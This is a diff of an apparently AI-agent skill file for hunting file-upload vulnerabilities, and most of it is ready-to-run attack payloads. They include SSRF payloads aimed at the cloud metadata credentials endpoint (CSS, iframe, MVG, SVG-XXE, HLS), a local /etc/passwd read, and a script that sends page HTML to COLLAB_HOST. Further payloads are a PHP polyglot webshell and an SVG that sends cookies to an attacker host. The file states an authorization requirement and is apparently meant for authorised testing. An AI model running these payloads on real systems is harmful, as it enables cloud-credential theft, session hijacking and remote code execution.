@@ -4,9 +4,54 @@ description: "Hunt file upload bugs — RCE via webshell, XSS via SVG/HTML, SSRF
 version: 1.1.0
 revision_date: 2026-07-25
 license: MIT
-category: redteam
-tags: [file-upload, hunt, redteam]
+platforms: [linux]
+metadata:
+  tags: [file-upload, hunt, redteam]
+  category: redteam
 ---
+
+## When to Use
+
+- Testing file upload features, avatar/attachment endpoints, import/export functions, XML/DOCX/ZIP processors.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`, `python3`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# Set once per engagement; every step below uses these.
+TARGET="example.com"   # or the engagement target
+export OUTPUT_DIR="${OUTPUT_DIR:-./output}"
+
+# Target: invoice generators, report exporters, screenshot services
+# Inject HTML that causes headless Chrome to fetch internal resources
+
+# SSRF via CSS import
+PAYLOAD='<html><head><style>@import url("http://169.254.169.254/latest/meta-data/");</style></head><body>test</body></html>'
+
+# SSRF via HTML iframe
+PAYLOAD='<html><body><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="1000" height="1000"></iframe></body></html>'
+
+# Local file read
+PAYLOAD='<html><body><iframe src="file:///etc/passwd" width="1000" height="1000"></iframe></body></html>'
+
+# JavaScript execution (if sandbox not enforced)
+export PAYLOAD='<html><body><script>fetch("http://COLLAB_HOST/chrome-rce?d="+encodeURIComponent(document.documentElement.innerHTML))</script></body></html>'
+
+# Test: submit HTML to any /generate-pdf, /export, /screenshot, /report endpoint
+curl --max-time 30 --connect-timeout 10 -s -X POST "https://$TARGET/api/generate-pdf" \
+  -H "Content-Type: application/json" \
+  -d "$(python3 -c 'import json,os; print(json.dumps({"html": os.environ["PAYLOAD"]}))')"
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
 
 ## Content-Type & Extension Bypass
 
@@ -60,14 +105,14 @@ filename=shell.phtml, shell.pHp, shell.php5   → extension variants
 cat > /tmp/ssrf.mvg << 'EOF'
 push graphic-context
 viewbox 0 0 640 480
-fill 'url(http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/)'
+fill 'url(http://169.254.169.254/latest/meta-data/iam/security-credentials/)'
 pop graphic-context
 EOF
 
 # SVG SSRF (ImageMagick processes SVG remotely)
 cat > /tmp/ssrf.svg << 'EOF'
 <?xml version="1.0"?>
-<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://[REDACTED_IP]/latest/meta-data/">]>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
 <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
   <image xlink:href="http://COLLAB_HOST/imagemagick-ssrf" width="200" height="200"/>
 </svg>
@@ -85,7 +130,7 @@ cat > /tmp/ssrf.m3u8 << 'EOF'
 #EXTM3U
 #EXT-X-MEDIA-SEQUENCE:0
 #EXTINF:10.0,
-http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
 #EXT-X-ENDLIST
 EOF
 
@@ -108,23 +153,21 @@ EOF
 # Inject HTML that causes headless Chrome to fetch internal resources
 
 # SSRF via CSS import
-PAYLOAD='<html><head><style>@import url("http://[REDACTED_IP]/latest/meta-data/");</style></head><body>test</body></html>'
+PAYLOAD='<html><head><style>@import url("http://169.254.169.254/latest/meta-data/");</style></head><body>test</body></html>'
 
 # SSRF via HTML iframe
-PAYLOAD='<html><body><iframe src="http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/" width="1000" height="1000"></iframe></body></html>'
+PAYLOAD='<html><body><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="1000" height="1000"></iframe></body></html>'
 
 # Local file read
 PAYLOAD='<html><body><iframe src="file:///etc/passwd" width="1000" height="1000"></iframe></body></html>'
 
 # JavaScript execution (if sandbox not enforced)
-PAYLOAD='<html><body><script>
-fetch("http://COLLAB_HOST/chrome-rce?d=" + encodeURIComponent(document.documentElement.innerHTML));
-</script></body></html>'
+export PAYLOAD='<html><body><script>fetch("http://COLLAB_HOST/chrome-rce?d="+encodeURIComponent(document.documentElement.innerHTML))</script></body></html>'
 
 # Test: submit HTML to any /generate-pdf, /export, /screenshot, /report endpoint
 curl --max-time 30 --connect-timeout 10 -s -X POST "https://$TARGET/api/generate-pdf" \
   -H "Content-Type: application/json" \
-  -d "{\"html\": \"$PAYLOAD\"}"
+  -d "$(python3 -c 'import json,os; print(json.dumps({"html": os.environ["PAYLOAD"]}))')"
 ```
 
 ---
@@ -151,30 +194,6 @@ curl --max-time 30 --connect-timeout 10 -s -X POST "https://$TARGET/api/import" 
 
 ---
 
-## Verification
-
-Run this self-test to confirm file-upload hunting readiness:
-
-1. **Skill integrity** — confirm the skill file is readable and well-formed:
-   ```bash
-   grep -q "name: hunt-file-upload" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
-   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
-   ```
-
-2. **Category check** — confirm the skill has a category:
-   ```bash
-   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
-   ```
-
-3. **Pitfalls section** — confirm pitfalls are documented:
-   ```bash
-   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
-   ```
-
-All 3 tests verify the skill is properly structured and ready for use.
-
----
-
 ## Pitfalls
 - **Upload without execution** — uploading a `.php` file to a directory that serves it as text/plain is not RCE. Need code execution, not just file storage.
 - **SVG XSS without same-origin rendering** — SVG uploaded to a different origin may not execute scripts due to CSP or same-origin policy. Test in the actual rendering context.
@@ -184,12 +203,20 @@ All 3 tests verify the skill is properly structured and ready for use.
 
 ---
 
+## Verification
+
+- Every promoted finding states the expected behavior, the observed response, and the negative control that rules out a false positive.
+- Impact is demonstrated with the minimum state change necessary; a status code, banner, or scanner label alone is not a finding.
+- Requests, responses, UTC timestamps, and tool versions are recorded beneath `${OUTPUT_DIR:-./output}` so a reviewer can reproduce the claim.
+
+---
+
 ## Related Skills & Chains
 
 - **`hunt-rce`** — File upload is the most common path to RCE on classic PHP/JSP/ASPX stacks once you find a directly-served upload directory or a deserializer-fed processor. Chain primitive: polyglot `GIF89a;<?php system($_GET['c']);?>` bypasses magic-byte check + `.phtml` extension bypasses allowlist → `GET /uploads/shell.phtml?c=id` → RCE; or PHP `phar://` upload to a sink calling `file_exists()` on the attacker-controlled path → PHP object deserialization → RCE.
 - **`hunt-xxe`** — Office formats (DOCX/XLSX/PPTX), SVGs, and SOAP attachments are XML inside a ZIP — every upload-and-parse feature is a latent XXE candidate. Chain primitive: upload DOCX whose `[Content_Types].xml` or `word/document.xml` includes a parameter-entity DTD pointing at attacker-controlled DTD → blind XXE OOB file read → exfil `/etc/passwd` or `web.config` via the document parser.
 - **`hunt-xss`** — SVGs, HTML files, and PDFs uploaded then served on the same origin are stored-XSS factories. Chain primitive: upload SVG with `<script>fetch('//attacker/?'+document.cookie)</script>` → victim views attachment at `app.target.com/uploads/x.svg` (same origin, not sandboxed) → cookie theft → ATO via session hijack.
-- **`hunt-ssrf`** — Image-processing libraries (ImageMagick, ffmpeg) fetch remote URLs from inside the uploaded file. Chain primitive: upload an SVG/MVG with `<image xlink:href="http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/">` or ffmpeg `concat:http://internal/...` → SSRF to AWS IMDS → cloud creds; the ImageTragick CVE-2016-3714 family is still alive on legacy farms.
+- **`hunt-ssrf`** — Image-processing libraries (ImageMagick, ffmpeg) fetch remote URLs from inside the uploaded file. Chain primitive: upload an SVG/MVG with `<image xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` or ffmpeg `concat:http://internal/...` → SSRF to AWS IMDS → cloud creds; the ImageTragick CVE-2016-3714 family is still alive on legacy farms.
 - **`security-arsenal`** — Reach for the file-upload bypass tree: 10-row extension/MIME/magic-byte bypass table (double-ext, null-byte, case variants, `.phtml`/`.phar`/`.php5`/`.pht`, `.htaccess` upload to re-enable handlers, `web.config` upload on IIS), SVG/MVG/SVGZ payloads, DOCX-XXE templates, ZIP-slip path traversal in archives, polyglot generators.
 - **`triage-validation`** — Apply the Reproducibility Gate. A file successfully uploaded but never served, never executed, never parsed by anything is not a finding — it's a write-only blob. Critical RCE requires the actual `whoami` round-trip from the uploaded shell; stored XSS requires the popup firing in a victim browser, not just the file existing on disk.
 
